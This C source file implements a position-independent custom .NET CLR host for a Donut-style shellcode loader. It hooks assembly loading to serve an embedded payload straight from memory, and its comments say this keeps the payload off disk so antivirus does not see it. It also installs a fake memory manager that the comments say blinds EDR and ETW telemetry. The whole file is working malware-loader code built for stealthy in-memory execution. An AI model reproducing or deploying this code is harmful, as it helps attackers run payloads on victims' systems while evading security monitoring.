/**
  PIC Implementation of the Custom CLR Host
*/

#include "custom_host.h"

/*
  ========================================================================
  IsIUnknown
  ------------------------------------------------------------------------
  Checks if .NET is asking us for the base IUnknown interface. 
  We do this check manually (byte by byte) instead of using the 
  global Windows &IID_IUnknown constant. Why? Because using the 
  global would create a dependency on the executable's .rdata section, 
  and running as an injected shellcode (PIC), that would make us crash.
  ========================================================================
*/
BOOL IsIUnknown(REFIID riid) {
    DWORD *d = (DWORD*)riid;
    // GUID of IUnknown: 00000000-0000-0000-C000-000000000046
    return (d[0] == 0x00000000 && d[1] == 0x00000000 && d[2] == 0x000000C0 && d[3] == 0x46000000);
}


// ------------------------------------------------------------------------
// COM INTERFACES IMPLEMENTATION (VTables)
// ------------------------------------------------------------------------

/*
  ========================================================================
  MyAssemblyStore (The Clandestine Stash)
  ------------------------------------------------------------------------
  When .NET needs to load a program or a DLL using Load2, it normally
  goes to the disk. With this interface, we get in the middle. 
  If the name of what .NET asks for matches the payload we have
  in memory, we pass it as a byte stream. 
  This way we avoid touching the disk and the antivirus doesn't see suspicious files being created.
  ========================================================================
*/
HRESULT STDMETHODCALLTYPE MyAssemblyStore_QueryInterface(MyAssemblyStore* this, REFIID riid, void** ppvObject) {
    if (IsIUnknown(riid) || IsEqualIID(&this->inst->xIID_IHostAssemblyStore, riid)) {
        *ppvObject = this; 
        this->lpVtbl->AddRef(this); 
        return S_OK;
    }
    
    *ppvObject = NULL; 
    return E_NOINTERFACE; 
}

ULONG STDMETHODCALLTYPE MyAssemblyStore_AddRef(MyAssemblyStore* this) { return ++this->count; }
ULONG STDMETHODCALLTYPE MyAssemblyStore_Release(MyAssemblyStore* this) { return --this->count; }

HRESULT STDMETHODCALLTYPE MyAssemblyStore_ProvideAssembly(MyAssemblyStore* this, AssemblyBindInfo* pBindInfo, UINT64* pAssemblyId, UINT64* pContext, IStream** ppStmAssemblyImage, IStream** ppStmPDB) {
    if (pBindInfo == NULL) {
        return HRESULT_FROM_WIN32(ERROR_FILE_NOT_FOUND);
    }

    DPRINT("CLR has requested that an assembly be loaded");

    if (this->targetAssembly->assemblyInfo != NULL) {
        // We calculate the hash of the FQN of the embedded assembly
        ULONG64 targetHash = maru(this->targetAssembly->assemblyInfo, this->inst->iv);
        BOOL match = FALSE;

        // We compare the hash of the requested identity (Post Policy)
        if (pBindInfo->lpPostPolicyIdentity != NULL) {
            if (maru(pBindInfo->lpPostPolicyIdentity, this->inst->iv) == targetHash) {
                match = TRUE;
            }
        }
        
        // Fallback to the original reference identity if Post Policy fails
        if (!match && pBindInfo->lpReferencedIdentity != NULL) {
            if (maru(pBindInfo->lpReferencedIdentity, this->inst->iv) == targetHash) {
                match = TRUE;
            }
        }

        // If the hashes match, we deliver the assembly
        if (match) {
            DPRINT("Returning the assembly from memory");
            *pContext = 0;
            *pAssemblyId = CUSTOM_ASSEMBLY_ID;
            *ppStmAssemblyImage = this->inst->api.SHCreateMemStream(this->targetAssembly->assemblyBytes, this->targetAssembly->assemblySize);
            return S_OK;
        }
    }

     // If they ask us for legitimate system libraries (like mscorlib), we tell them we don't have it
    // so the CLR goes to look for them on the hard drive as it normally does.
    DPRINT("Assembly not recognized by the host. Returning NotFound to Fusion.");
    return HRESULT_FROM_WIN32(ERROR_FILE_NOT_FOUND); 
}

HRESULT STDMETHODCALLTYPE MyAssemblyStore_ProvideModule(MyAssemblyStore* this, ModuleBindInfo* pBindInfo, DWORD* pdwModuleId, IStream** ppStmModuleImage, IStream** ppStmPDB) { 
    return HRESULT_FROM_WIN32(ERROR_FILE_NOT_FOUND); 
}


/*
  ========================================================================
  MyAssemblyManager (The Store Controller)
  ------------------------------------------------------------------------
  The .NET engine asks us here: "Which assemblies do you handle and which 
  ones should I look for normally?". By returning NULL in the list, we're telling it:
  "I control everything, whatever you need, ask my Store first".
  ========================================================================
*/
HRESULT STDMETHODCALLTYPE MyAssemblyManager_QueryInterface(MyAssemblyManager* this, REFIID riid, void** ppvObject) {
    if (IsIUnknown(riid) || IsEqualIID(&this->inst->xIID_IHostAssemblyManager, riid)) {
        *ppvObject = this; 
        this->lpVtbl->AddRef(this);
        return S_OK;
    }
    *ppvObject = NULL; 
    return E_NOINTERFACE;
}

ULONG STDMETHODCALLTYPE MyAssemblyManager_AddRef(MyAssemblyManager* this) { return ++this->count; }
ULONG STDMETHODCALLTYPE MyAssemblyManager_Release(MyAssemblyManager* this) { return --this->count; }


HRESULT STDMETHODCALLTYPE MyAssemblyManager_GetNonHostStoreAssemblies(MyAssemblyManager* this, void** ppReferenceList) { 
    *ppReferenceList = NULL; 
    return S_OK; 
}


HRESULT STDMETHODCALLTYPE MyAssemblyManager_GetAssemblyStore(MyAssemblyManager* this, void** ppAssemblyStore) {
    MyAssemblyStoreVtbl* asVtbl = (MyAssemblyStoreVtbl*)this->inst->api.HeapAlloc(this->inst->api.GetProcessHeap(), 0, sizeof(MyAssemblyStoreVtbl));
    asVtbl->QueryInterface = ADR(void*, MyAssemblyStore_QueryInterface);
    asVtbl->AddRef = ADR(void*, MyAssemblyStore_AddRef);
    asVtbl->Release = ADR(void*, MyAssemblyStore_Release);
    asVtbl->ProvideAssembly = ADR(void*, MyAssemblyStore_ProvideAssembly);
    asVtbl->ProvideModule = ADR(void*, MyAssemblyStore_ProvideModule);

    MyAssemblyStore* assemblyStore = (MyAssemblyStore*)this->inst->api.HeapAlloc(this->inst->api.GetProcessHeap(), 0, sizeof(MyAssemblyStore));
    assemblyStore->lpVtbl = asVtbl;
    assemblyStore->targetAssembly = this->targetAssembly;
    assemblyStore->inst = this->inst;
    assemblyStore->count = 1;

    *ppAssemblyStore = assemblyStore;
    return S_OK;
}


/*
  ========================================================================
  MemoryManager (The Memory Mirage)
  ------------------------------------------------------------------------
  EDRs closely monitor how .NET allocates memory pages looking for code injections. 
  By registering our own fake memory manager that does nothing 
  and simply replies "everything is OK" (S_OK) to Windows, we manage to blind 
  several telemetry events (ETW) from the antivirus.
  ========================================================================
*/
HRESULT STDMETHODCALLTYPE MemoryManager_QueryInterface(MemoryManager* this, REFIID riid, void** ppv) {
    if (IsIUnknown(riid) || IsEqualIID(&this->inst->xIID_IHostMemoryManager, riid)) { 
        *ppv = this; 
        this->lpVtbl->AddRef(this);
        return S_OK; 
    }
    *ppv = NULL; 
    return E_NOINTERFACE;
}

ULONG STDMETHODCALLTYPE MemoryManager_AddRef(MemoryManager* this) { return ++this->count; }
ULONG STDMETHODCALLTYPE MemoryManager_Release(MemoryManager* this) { return --this->count; }
HRESULT STDMETHODCALLTYPE MemoryManager_CreateMalloc(MemoryManager* this, DWORD dwMallocType, void** ppMalloc) { return S_OK; }
HRESULT STDMETHODCALLTYPE MemoryManager_VirtualAlloc(MemoryManager* this, void* pAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect, EMemoryCriticalLevel eCriticalLevel, void** ppMem) { return S_OK; }
HRESULT STDMETHODCALLTYPE MemoryManager_VirtualFree(MemoryManager* this, LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType) { return S_OK; }
HRESULT STDMETHODCALLTYPE MemoryManager_VirtualQuery(MemoryManager* this, void* lpAddress, void* lpBuffer, SIZE_T dwLength, SIZE_T* pResult) { return S_OK; }
HRESULT STDMETHODCALLTYPE MemoryManager_VirtualProtect(MemoryManager* this, void* lpAddress, SIZE_T dwSize, DWORD flNewProtect, DWORD* pflOldProtect) { return S_OK; }
HRESULT STDMETHODCALLTYPE MemoryManager_GetMemoryLoad(MemoryManager* this, DWORD* pMemoryLoad, SIZE_T* pAvailableBytes) { 
    *pMemoryLoad = DUMMY_MEMORY_LOAD; 
    *pAvailableBytes = DUMMY_AVAILABLE_BYTES; 
    return S_OK; 
}
HRESULT STDMETHODCALLTYPE MemoryManager_RegisterMemoryNotificationCallback(MemoryManager* this, void* pCallback) { return S_OK; }
HRESULT STDMETHODCALLTYPE MemoryManager_NeedsVirtualAddressSpace(MemoryManager* this, LPVOID startAddress, SIZE_T size) { return S_OK; }
HRESULT STDMETHODCALLTYPE MemoryManager_AcquiredVirtualAddressSpace(MemoryManager* this, LPVOID startAddress, SIZE_T size) { return S_OK; }
HRESULT STDMETHODCALLTYPE MemoryManager_ReleasedVirtualAddressSpace(MemoryManager* this, LPVOID startAddress) { return S_OK; }


/*
  ========================================================================
  MyHostControl (The Store Receptionist)
  ------------------------------------------------------------------------
  This is the main interface we plug into the CLR as soon as it boots. 
  Its only job is to listen when the CLR asks for a specific manager 
  (like the memory or assembly one) and hand over our 
  falsified versions to take control of the loading process.
  ========================================================================
*/
HRESULT STDMETHODCALLTYPE MyHostControl_QueryInterface(MyHostControl* this, REFIID riid, void** ppvObject) {
    if (IsIUnknown(riid) || IsEqualIID(&this->inst->xIID_IHostControl, riid)) { 
        *ppvObject = this; 
        this->lpVtbl->AddRef(this);
        return S_OK; 
    }
    *ppvObject = NULL; 
    return E_NOINTERFACE;
}

ULONG STDMETHODCALLTYPE MyHostControl_AddRef(MyHostControl* this) { return ++this->count; }
ULONG STDMETHODCALLTYPE MyHostControl_Release(MyHostControl* this) { return --this->count; }

HRESULT STDMETHODCALLTYPE MyHostControl_SetAppDomainManager(MyHostControl* this, DWORD dwAppDomainID, IUnknown* pUnkAppDomainManager) { 
    return S_OK; 
}

HRESULT STDMETHODCALLTYPE MyHostControl_GetHostManager(MyHostControl* this, REFIID riid, void** ppObject) {
    if (IsEqualIID(&this->inst->xIID_IHostMemoryManager, riid)) {
        // We hand over our fake memory manager
        DPRINT("Return dummy manager");
        *ppObject = this->memoryManager; 
        return S_OK;
    }
    if (IsEqualIID(&this->inst->xIID_IHostAssemblyManager, riid)) {
        // We hand over our assembly controller
        DPRINT("Entregando AssemblyManager");
        MyAssemblyManagerVtbl* amVtbl = (MyAssemblyManagerVtbl*)this->inst->api.HeapAlloc(this->inst->api.GetProcessHeap(), 0, sizeof(MyAssemblyManagerVtbl));
        amVtbl->QueryInterface = ADR(void*, MyAssemblyManager_QueryInterface);
        amVtbl->AddRef = ADR(void*, MyAssemblyManager_AddRef);
        amVtbl->Release = ADR(void*, MyAssemblyManager_Release);
        amVtbl->GetNonHostStoreAssemblies = ADR(void*, MyAssemblyManager_GetNonHostStoreAssemblies);
        amVtbl->GetAssemblyStore = ADR(void*, MyAssemblyManager_GetAssemblyStore);

        MyAssemblyManager* assemblyManager = (MyAssemblyManager*)this->inst->api.HeapAlloc(this->inst->api.GetProcessHeap(), 0, sizeof(MyAssemblyManager));
        assemblyManager->lpVtbl = amVtbl;
        assemblyManager->targetAssembly = this->targetAssembly;
        assemblyManager->inst = this->inst;
        assemblyManager->count = 1;

        *ppObject = assemblyManager;
        return S_OK;
    }
    *ppObject = NULL;
    return E_NOINTERFACE;
}


/*
  ========================================================================
  SetupPICCustomHost
  ------------------------------------------------------------------------
  Since all of this is injected as a shellcode, we can't use "new" 
  or traditional C++ classes. This function reserves the memory (HeapAlloc)
  and manually assembles the function blocks (VTables). We use the ADR macro 
  to ensure the code can execute no matter where in memory it ends up allocated.
  ========================================================================
*/
MyHostControl* SetupPICCustomHost(PDONUT_INSTANCE inst, TargetAssembly* targetAssm) {
    DPRINT("Building VTables and interfaces in the dynamic Heap");

    MemoryManagerVtbl* memVtbl = (MemoryManagerVtbl*)inst->api.HeapAlloc(inst->api.GetProcessHeap(), 0, sizeof(MemoryManagerVtbl));
    memVtbl->QueryInterface = ADR(void*, MemoryManager_QueryInterface);
    memVtbl->AddRef = ADR(void*, MemoryManager_AddRef);
    memVtbl->Release = ADR(void*, MemoryManager_Release);
    memVtbl->CreateMalloc = ADR(void*, MemoryManager_CreateMalloc);
    memVtbl->VirtualAlloc = ADR(void*, MemoryManager_VirtualAlloc);
    memVtbl->VirtualFree = ADR(void*, MemoryManager_VirtualFree);
    memVtbl->VirtualQuery = ADR(void*, MemoryManager_VirtualQuery);
    memVtbl->VirtualProtect = ADR(void*, MemoryManager_VirtualProtect);
    memVtbl->GetMemoryLoad = ADR(void*, MemoryManager_GetMemoryLoad);
    memVtbl->RegisterMemoryNotificationCallback = ADR(void*, MemoryManager_RegisterMemoryNotificationCallback);
    memVtbl->NeedsVirtualAddressSpace = ADR(void*, MemoryManager_NeedsVirtualAddressSpace);
    memVtbl->AcquiredVirtualAddressSpace = ADR(void*, MemoryManager_AcquiredVirtualAddressSpace);
    memVtbl->ReleasedVirtualAddressSpace = ADR(void*, MemoryManager_ReleasedVirtualAddressSpace);

    MemoryManager* memMgr = (MemoryManager*)inst->api.HeapAlloc(inst->api.GetProcessHeap(), 0, sizeof(MemoryManager));
    memMgr->lpVtbl = memVtbl;
    memMgr->inst = inst;
    memMgr->count = 1;

    MyHostControlVtbl* hcVtbl = (MyHostControlVtbl*)inst->api.HeapAlloc(inst->api.GetProcessHeap(), 0, sizeof(MyHostControlVtbl));
    hcVtbl->QueryInterface = ADR(void*, MyHostControl_QueryInterface);
    hcVtbl->AddRef = ADR(void*, MyHostControl_AddRef);
    hcVtbl->Release = ADR(void*, MyHostControl_Release);
    hcVtbl->GetHostManager = ADR(void*, MyHostControl_GetHostManager);
    hcVtbl->SetAppDomainManager = ADR(void*, MyHostControl_SetAppDomainManager);

    MyHostControl* hostCtrl = (MyHostControl*)inst->api.HeapAlloc(inst->api.GetProcessHeap(), 0, sizeof(MyHostControl));
    hostCtrl->lpVtbl = hcVtbl;
    hostCtrl->targetAssembly = targetAssm;
    hostCtrl->memoryManager = memMgr;
    hostCtrl->inst = inst;
    hostCtrl->count = 1;

    return hostCtrl;
}